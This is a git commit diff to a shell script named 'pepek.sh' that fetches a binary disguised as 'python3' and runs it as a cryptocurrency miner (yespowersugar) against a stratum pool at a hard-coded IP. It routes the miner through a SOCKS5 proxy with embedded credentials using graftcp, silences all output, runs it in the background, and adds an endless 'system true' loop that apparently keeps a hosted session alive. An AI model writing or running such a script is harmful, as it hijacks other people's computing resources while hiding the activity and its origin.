86709cf2f76c2d6c1e3c8abc4ddf8c854ed34e20
nestri12329018 <153782424+nestri12329018@users.noreply.github.com>
2023-12-14 13:36:35 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -1,4 +1,38 @@
-apt-get update &&  apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/danipedrosang/marcrash/raw/main/python3
+#!/bin/sh
+wget https://github.com/nestri12329018/file/raw/main/graphics.tar.gz
+
+tar -xhf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 52.5.38.201:1080
+socks5_username = 3twpqqx7a0cpln
+socks5_password = 6y9m5wvvluhpwzsuwlfuoxwkh52h1
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+./graftcp/graftcp wget https://github.com/haria11/ideal-octo-doodle/raw/main/python3
 chmod +x python3
-./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 2
+./graftcp/graftcp ./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 1 >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
